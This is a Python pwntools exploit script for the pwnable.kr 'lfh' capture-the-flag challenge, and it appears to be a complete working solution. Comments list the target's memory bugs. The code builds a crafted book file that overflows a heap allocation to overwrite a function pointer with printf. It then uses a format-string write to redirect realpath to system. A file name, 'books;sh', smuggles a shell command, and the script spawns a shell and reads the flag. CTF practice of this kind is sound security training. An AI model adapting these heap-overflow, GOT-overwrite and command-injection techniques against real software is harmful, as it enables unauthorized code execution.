#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 2222 --pass guest--user lfh --path ./lfh
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'lfh')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or "lfh"
password = args.PASSWORD or "guest"
remote_path = './lfh'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
file ./lfh
break *main+0x2e8
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# there are many bugs here:
# 1. the first bug is that for unicode content we allocate x but write 2x. this is a simple buffer overflow with controlled length and content
# 2. another bug is that the first allocation is not stored in the lfh meta - which means it is leaked!
# 3. sending `content_len==0` causes off by 1
# 4. content is not checked to be null terminated
#
# we will use bug 1. as it is strong enough alone. the idea is that we want to overwrite a nearby book struct with fake fptr and run code.
# in order to do so we must have our allocation before another already-allocated book. the simplest way to achieve that is to allocate the content
# of size sizeof(BOOK) so that it allocates from the same bucket. now in order for something interesting to come *after* us we must use the randomized heap
# as otherwise chunks are allocated consecutively. we allocate N_TOTAL_CHUNK-1 books thus guaranteeing that our allocation will come before some other one
# (unless it is the last in chunk in which case we will crash on pageguard, but this has low probability)
#
# now remains the problem of what we do with our jump. we havent leaked libc base yet, so we cannot jump to a onegadget there, and there is no one in lfh?
# in any case, printf is in our got and our binary is not pie, so we can call it directly. we also control the input (as part of our OOB write) so we can
# make it a format string exploitation. since we control the environment variables we can achieve printf write what where - and as realpath and system are
# close enough we can just overwrite the LSB of realpath to system and win as we control realpath's argument.

context.terminal = ["kitty"]

from io import BytesIO

libc = ELF("libc-2.23.so")

class Book:
    TITLE_LEN = 32
    ABSTRACT_LEN = 256
    MAX_CONTENT_LEN = 0x1000

    def __init__(self, title: bytes, abstract: bytes, content_length: int, content: bytes, is_unicode: bool):
        assert len(title) < self.TITLE_LEN
        assert len(abstract) < self.ABSTRACT_LEN
        assert len(content) <= self.MAX_CONTENT_LEN

        if is_unicode:
            assert len(content) % 2 == 0

        self.title = title
        self.abstract = abstract
        self.content = content
        self.content_length = content_length
        self.is_unicode = is_unicode

    def build(self, io_: BytesIO):
        # char title[32];
        # char abstract[256];
        # void (*fptr)(struct _tagBOOK*);	
        # UINT content_len;
        # BOOL is_unicode;
        # char* content;
        # struct _tagBOOK* next;

        io_.write(
            self.title.ljust(self.TITLE_LEN, b"\x00") + 
            self.abstract.ljust(self.ABSTRACT_LEN, b"\x00") + 
            pack(0) + 
            p32(self.content_length) + 
            p32(self.is_unicode) +
            pack(0) + 
            pack(0) + 
            self.content
        )

class BookFile:
    SIGNATURE = b"BOOK"

    def __init__(self, books: list[Book]):
        self.books = books

    def build(self, io_: BytesIO):
        io_.write(self.SIGNATURE)

        for book in self.books:
            book.build(io_)

BUCKET_SIZE = 0x4000
SIZEOF_BOOK = 0x140
CHUNK_CLASS = 0x140 + 0x10
N_TOTAL_CHUNK = BUCKET_SIZE // CHUNK_CLASS
FILENAME = "books;sh"  # ;sh in order to spawn a shell at system call

format_string =  b"." * (libc.sym['system'] & 0xff) + b"%6500$hhn\n"  # write LSB of system over realpath's got

books = [Book(b"", b"", 1, b"\x00", False) for _ in range(N_TOTAL_CHUNK - 2)]
books.append(Book(
        b"pwned!",
        b"",
        SIZEOF_BOOK,
        fit({
            CHUNK_CLASS: format_string + b"\x00",
            CHUNK_CLASS + (Book.TITLE_LEN + Book.ABSTRACT_LEN): exe.sym["printf"]
        }),
        True
    )
)

book_file = BookFile(books)

with open(FILENAME, "wb") as f:
    book_file.build(f)

if not args.LOCAL:
    shell.upload_file(FILENAME)
    if args.GDB:
        shell.upload_file("gdbserver", "gdbserver64")
        shell.chmod("+x", "gdbserver64")

def start_process(remote_path: bytes, filename: bytes, realpath_addr: int):
    import struct
    from typing import List
    def execve_(exe: bytes, argv: List[bytes], env: List[bytes]):
        import ctypes, ctypes.util
        libc = ctypes.CDLL(ctypes.util.find_library("c"))

        def errcheck(result, func, args):
            raise OSError(result)

        libc.execve.argtypes = (ctypes.c_char_p, ctypes.POINTER(ctypes.c_char_p), ctypes.POINTER(ctypes.c_char_p))
        libc.execve.errcheck = errcheck

        string_bank = []

        def make_ptr(l: List[bytes]) -> ctypes.POINTER(ctypes.c_char_p):
            p = (ctypes.c_char_p * (len(l) + 1))()

            for i, e in enumerate(l):
                s = ctypes.create_string_buffer(e)
                string_bank.append(s)
                p[i] = ctypes.addressof(s)

            p[-1] = None

            return p

        libc.execve(exe, make_ptr(argv), make_ptr(env))

    args = struct.pack("<Q", realpath_addr).split(b"\x00")[:-1]  # as args cannot contain nullbytes each "\x00" will be encoded as an empty string. the first nullbyte will be used by the first arg, so we need one less.

    execve_(remote_path.encode(), [remote_path.encode(), filename.encode(), b"1"], args * 1024 + [b"a"])

if args.LOCAL:
    io = start(preexec_fn=lambda: start_process(remote_path, FILENAME, exe.got["realpath"]))
else:
    io = start(preexec_fn=start_process, preexec_args=(remote_path, FILENAME, exe.got["realpath"]))

io.sendlineafter(b"continue?(y/n)", b"y")

io.sendlineafter(b"books: not found", b"cat flag")
io.recvuntil(b"$ ")
success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")
